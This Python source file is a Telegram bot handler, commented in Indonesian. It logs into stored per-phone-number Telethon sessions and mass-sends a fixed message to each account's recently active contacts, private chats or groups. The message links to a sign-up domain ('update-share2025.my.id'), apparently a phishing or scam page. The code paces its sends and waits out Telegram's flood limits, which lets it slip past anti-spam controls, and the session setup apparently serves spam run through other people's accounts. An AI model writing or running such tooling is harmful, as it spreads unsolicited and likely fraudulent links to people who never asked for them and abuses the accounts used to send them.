from datetime import datetime, timedelta, timezone
from telethon import TelegramClient, errors
import os
import asyncio
from config import SESSION_FOLDER, API_ID, API_HASH
from telegram.constants import ParseMode
from telegram import Update
from telegram.ext import ContextTypes
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import User, UserStatusOffline, UserStatusRecently


async def broadcast_via_dialog_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, mode: str = "all"):
    query = update.callback_query
    await query.answer()

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await query.message.reply_text(
            f"❌ Session tidak ditemukan untuk:\n`{phone_number}`\n\nCek path:\n`{session_path}`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    await query.message.reply_text(
        f"✅ Session ditemukan untuk {phone_number}. Mulai broadcast ke *{mode} user aktif*...",
        parse_mode=ParseMode.MARKDOWN
    )

    pesan_broadcast = "📢 Hai, ini adalah pesan dari akun kami. Semoga harimu menyenangkan!\n\n" \
                      "Klik di sini untuk mengunjungi website kami: [Kunjungi Website](https://daftar.update-share2025.my.id/)"

    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        await query.message.reply_text("❌ Akun belum login.")
        return

    try:
        count = 0
        now = datetime.now(timezone.utc)
        seven_days_ago = now - timedelta(days=7)


        # Ambil target: dialog atau kontak
        targets = []
        if mode == "contact":
            contacts = await client(GetContactsRequest(hash=0))
            targets = contacts.users
        elif mode == "group":
            async for dialog in client.iter_dialogs():
                entity = dialog.entity
                if hasattr(entity, 'megagroup') and entity.megagroup:  # hanya supergroup dan grup
                    targets.append(entity)
        else:
            async for dialog in client.iter_dialogs():
                entity = dialog.entity
                if isinstance(entity, User) and not getattr(entity, 'bot', False) and entity.id > 0:
                    targets.append(entity)

        for target in targets:
                if mode != "group":
                    status = getattr(target, 'status', None)

                    if isinstance(status, UserStatusRecently):
                        pass
                    elif isinstance(status, UserStatusOffline):
                        if status.was_online < seven_days_ago:
                            continue
                    else:
                        continue

                try:
                    await client.send_message(
                        target,
                        pesan_broadcast,
                        parse_mode=ParseMode.MARKDOWN
                    )
                    print(f"✅ Terkirim ke: {target.id} - {getattr(target, 'username', None) or getattr(target, 'title', None)}")
                    count += 1
                    await asyncio.sleep(2.5)
                except errors.FloodWaitError as e:
                    print(f"⏳ FloodWait {e.seconds} detik.")
                    await asyncio.sleep(e.seconds + 5)
                except Exception as e:
                    print(f"❌ Gagal kirim ke {target.id}: {e}")

        await query.message.reply_text(
            f"✅ Broadcast selesai.\nMode: *{mode}*\nTotal terkirim: {count} user.",
            parse_mode=ParseMode.MARKDOWN
        )
    finally:
        await client.disconnect()
